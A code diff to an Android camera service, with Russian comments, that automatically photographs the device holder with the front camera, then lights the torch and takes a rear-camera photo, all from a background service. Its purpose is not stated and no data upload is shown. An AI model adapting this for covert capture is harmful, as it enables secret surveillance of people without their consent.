@@ -21,6 +21,7 @@ public class CameraService extends Service {
     private CameraDevice device;
     private ImageReader reader;
     private CaptureRequest.Builder builder;
+    private String torchId;
 
     @Nullable @Override public IBinder onBind(Intent i) { return null; }
 
@@ -32,7 +33,15 @@ public class CameraService extends Service {
         startForeground(1, n);
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        capturePhoto("front", "1"); 
+        try {
+            for (String id : manager.getCameraIdList()) {
+                Boolean flash = manager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                if (flash != null && flash) { torchId = id; break; }
+            }
+        } catch (Exception e) {}
+
+        // 1. Сначала снимаем лицо (фронталка)
+        capturePhoto("face", "1"); 
         return START_NOT_STICKY;
     }
 
@@ -79,20 +88,30 @@ public class CameraService extends Service {
                         
                         img.close(); r.close(); device.close();
                         
-                        // Переключаемся на заднюю камеру без задержек и вспышек
-                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                            if (tag.equals("front")) {
-                                capturePhoto("back", "0"); 
-                            } else {
-                                stopSelf();
-                            }
-                        }, 200);
-                        
+                        if (tag.equals("face")) {
+                            // После фронталки включаем свет и снимаем заднюю
+                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                try {
+                                    if (torchId != null) manager.setTorchMode(torchId, true); // Включаем свет
+                                } catch (Exception e) {}
+                                
+                                // Ждем 1 секунду, чтобы свет разгорелся
+                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                    capturePhoto("back", "0");
+                                }, 1000);
+                                
+                            }, 500);
+                        } else {
+                            // После задней выключаем свет
+                            try {
+                                if (torchId != null) manager.setTorchMode(torchId, false);
+                            } catch (Exception e) {}
+                            stopSelf();
+                        }
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                         builder.addTarget(reader.getSurface());
-                        // Никакой принудительной вспышки! Просто снимок при текущем освещении.
                         device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override public void onConfigured(CameraCaptureSession s) {
                                 try { s.capture(builder.build(), null, null); } catch (Exception e) { e.printStackTrace(); }
